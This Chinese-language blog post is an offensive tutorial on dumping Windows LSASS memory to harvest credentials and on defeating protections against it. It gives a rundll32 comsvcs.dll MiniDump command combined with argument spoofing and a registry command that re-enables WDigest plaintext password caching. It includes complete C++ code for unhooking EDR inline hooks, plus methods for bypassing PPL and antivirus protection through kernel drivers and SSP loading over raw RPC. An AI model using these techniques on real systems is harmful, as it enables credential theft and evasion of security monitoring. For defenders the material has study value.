---
layout: post
title: Dump LSASS的底层原理与对抗
summary: 
featured-img: lsass
---



## Credentials storage

From MSDN:

+ Security Accounts Manager database(SAM)
  + ( No password is ever stored in a SAM database—only the password hashes. )
+ LSASS process memory
  + Reversibly encrypted plaintext
  + Kerberos tickets (TGTs, service tickets)
  + NT hash
  + LM hash
+ LSA secrets on the hard disk driver
  + Account password for the computer’s AD DS account
  + Account passwords for Windows services that are configured on the computer
  + Account passwords for configured scheduled tasks
  + Account passwords for IIS application pools and websites
+ AD DS database(NTDS.dit)
  + ( Writable DC has a full copy of AD DS database, RODCs has a subset of the accounts, do not have a copy of privileged domain accounts )
  + NT hash for the current password
  + NT hashes for password history (if configured)
+ Credential Manager store
  + ( Stored on the hard disk drive, protected by DPAPI )

***

对于工作组环境的账户凭据，仅需关注SAM和lsass，对于SAM，则通过文件系统（卷影复制）或注册表来获取hash，不赘述

## Dump LSASS

### dbgcore!MiniDumpWriteDump

该API可Dump进程内存，生成转储文件

```c++
BOOL MiniDumpWriteDump(
    hProcess, 
    dwProcessId, 
    hFile, 
    MiniDumpWithFullMemory, 
    NULL, NULL, NULL
);
```

`dbghelp!MiniDumpWriteDump`指向`dbgcore!MiniDumpWriteDump`

### comsvcs!MiniDump

该函数为`MiniDumpWriteDump`的封装

签名，前两个参数未使用，第三个参数为`"[PID] [FILENAME] [Mode]"`格式的字符串

```c++
HRESULT WINAPI MiniDumpW(DWORD, DWORD, PWCHAR);
```

`rundll32`的entrypoint签名是

```c++
void CALLBACK EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
```

所以可以直接白名单利用，配合CommanLine参数欺骗更佳（参数欺骗见https://github.com/EddieIvan01/win32api-practice/tree/master/argument-spoofer）

```
rundll32 comsvcs.dll MiniDump [PID] 1.bin full

.\argument-spoofer.exe "rundll32 comsvcs.dll MiniDump [PID] 1.bin full"
```

### ntdll!NtReadVirtualMemory

说到底`MiniDumpWriteDump`也只是读取进程虚拟内存并解析结构化数据，到R3最底层还是通过`NtReadVirtualMemory`系统调用，所以完全可以读取后自行解析，这样就可以消除`MiniDump`API的特征

（没有代码，解析结构工作量挺大的，而且意义不大，EDR更可能会针对`NtReadVirtualMemory`

## 对抗

### Disable WDigest SSP

在低版本中，Mimikatz的WDigest模块能够从lsass中抓取到明文密码

因为Wdigest SSP的认证是challenge/response机制，而response的计算需要明文密码而不是hash(见[n1nty-Mimikatz_WDigest](https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&mid=2247483811&idx=1&sn=787dc8ba5130d810ff314da12a1eed29&chksm=ecb11d53dbc69445cff3acd5bf06274e81748347fd61700e54d235029087bfb30b0c60cd217b&sessionid=0&scene=126&clicktime=1595831591&enterid=1595831591&ascene=3&devicetype=android-28&version=2700103e&nettype=3gnet&abtest_cookie=AAACAA%3D%3D&lang=zh_CN&exportkey=A3dpDW6l%2BIIBM25L620vBCE%3D&pass_ticket=4UjWDF9FzrBdr3gJBM7VLbepiEigo88J2L5CcpXCH7o%3D&wx_header=1))，所以lsass进程中需要保存明文密码

```
response = md5(md5(username + realm + password) + nonce + md5(method + digestURI))
```

在安装KB2871997后，可配置禁用WDigest SSP(高版本默认禁用)，lsass进程不再保存明文密码，见[link](https://getadmx.com/?Category=SecurityBaseline&Policy=Microsoft.Policies.PtH::Pol_PtH_WDigestAuthn)

配置启用WDigest，修改注册表后重启

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```



### API Inline Hook

针对内存Dump，部分EDR会inline-hook关键函数，例如`ntdll!NtReadVirtualMemory`

通过对比内存和磁盘上DLL中函数的字节码，检测并解除inline-hook

完整代码见https://github.com/EddieIvan01/win32api-practice/tree/master/procdump

这里使用了`VirtualProtect`，也有很大概率被Hook，可以参考[这篇文章](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)，通过直接系统调用，也就是直接用syscall instruction去调用`NtProtectVirtualMemory`系统调用

```c++
BOOL CheckAPIHookedAndTryUnHook(WCHAR* lpDllFileName, CHAR* pAPIName) {
    HANDLE hDllFile = CreateFile(
        lpDllFileName,
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hDllFile == INVALID_HANDLE_VALUE)
        return FALSE;

    HANDLE hDllFileMapping = CreateFileMapping(hDllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    VOID* pDllFileMappingBase = MapViewOfFile(hDllFileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hDllFile);

    // https://0xpat.github.io/Malware_development_part_2/
    IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pDllFileMappingBase;
    IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)((PBYTE)pDllFileMappingBase + pDosHeader->e_lfanew);
    IMAGE_OPTIONAL_HEADER* pOptionalHeader = (IMAGE_OPTIONAL_HEADER*)&(pNtHeader->OptionalHeader);
    IMAGE_EXPORT_DIRECTORY* pExportDirectory = (IMAGE_EXPORT_DIRECTORY*)
        ((BYTE*)pDllFileMappingBase + pOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    ULONG* pAddressOfFunctions = (ULONG*)((BYTE*)pDllFileMappingBase + pExportDirectory->AddressOfFunctions);
    ULONG* pAddressOfNames = (ULONG*)((BYTE*)pDllFileMappingBase + pExportDirectory->AddressOfNames);
    USHORT* pAddressOfNameOrdinals = (USHORT*)((BYTE*)pDllFileMappingBase + pExportDirectory->AddressOfNameOrdinals);

    VOID* pAPIProcOriginal = NULL;
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        CHAR* pFunctionName = (BYTE*)pDllFileMappingBase + pAddressOfNames[i];
        if (!strcmp(pFunctionName, pAPIName)) {
            pAPIProcOriginal = (VOID*)((BYTE*)pDllFileMappingBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
            break;
        }
    }
    if (pAPIProcOriginal == NULL)
        return FALSE;

    DWORD dwSlashIndex = 0;
    for (DWORD i = wcslen(lpDllFileName); i > 0; i--) {
        if (lpDllFileName[i] == L'\\') {
            dwSlashIndex = i + 1;
            break;
        }
    }

    VOID* pAPIProc = GetProcAddress(GetModuleHandle(lpDllFileName + dwSlashIndex), pAPIName);
    if (pAPIProc == NULL)
        return FALSE;

    if (memcmp(pAPIProc, pAPIProcOriginal, 5)) {
        wprintf(L"%s!%S is hooked, try unhook\n", lpDllFileName + dwSlashIndex, pAPIName);
        DWORD dwOldProtect;
        DWORD dwTmpProtect;
        if (!VirtualProtect(pAPIProc, 5, PAGE_READWRITE, &dwOldProtect))
            return FALSE;
        memcpy(pAPIProc, pAPIProcOriginal, 5);
        if (!VirtualProtect(pAPIProc, 5, dwOldProtect, &dwTmpProtect))
            return FALSE;
        return TRUE;
    }
    else
        wprintf(L"%s!%S is not hooked\n", lpDllFileName + dwSlashIndex, pAPIName);

    return TRUE;
}
```

### PPL

Windows8.1后引入了[PPL(Protected Process Light)](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)。对于lsass进程来说，`type=PsProtectedTypeProtectedLight`和`signer=PsProtectedSignerLsa`

注册表配置

```
PS C:\> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
    RunAsPPL    REG_DWORD    0x1
```

当lsass配置RunAsPPL时，可以防止读取内存和注入代码。具体来说，以`QUERY_INFORMATION`或`VM_READ`打开进程句柄时会返回error code 5（Access denied），无论操作者权限多高

***

第一种方法，修改注册表（删除RunAsPPL项）后重启

第二种方法，因为要读写系统内存，所以只能通过内核模式的驱动程序来操作。除了利用mimidrv.sys，还有：[RedCursorSecurityConsulting/PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) 和 [Mattiwatti/PPLKiller](https://github.com/Mattiwatti/PPLKiller)

### AV Process Protection

AV(如卡巴斯基)的加固方式其实我并不清楚，猜测可能是R0层的Hook(SSDT)，检测对LSASS的内存读取

xpn的[Blog](https://blog.xpnsec.com/exploring-mimikatz-part-2/)中提到的方法

思路为：

1. 通过`AddSecurityProvider`添加一个SSP，不需要重启系统，但会需要修改注册表，因为该API调用成功后会添加DLL到`HKLM\System\CurrentControlSet\Control\Lsa`

   ```c++
   SECURITY_STATUS SEC_ENTRY AddSecurityPackage(
     LPSTR                     pszPackageName,
     PSECURITY_PACKAGE_OPTIONS pOptions
   );
   ```

2. 该SSP(DLL)被加载到lsass进程中，Dump自身内存

3. 通过步骤1里`AddSecurityProvider`加载的DLL，可被`EnumerateSecurityPackages`枚举，且`AddSecurityPackage`中有一些多余的操作/校验(例如注册表项)。因为本质上该API的功能是通过RPC来操作lsass进程的，所以可以直接使用raw RPC call来完成`AddSecurityPackage`的功能

修改后的版本：https://github.com/EddieIvan01/win32api-practice/tree/master/dump-lsass-via-rpc-addssp 
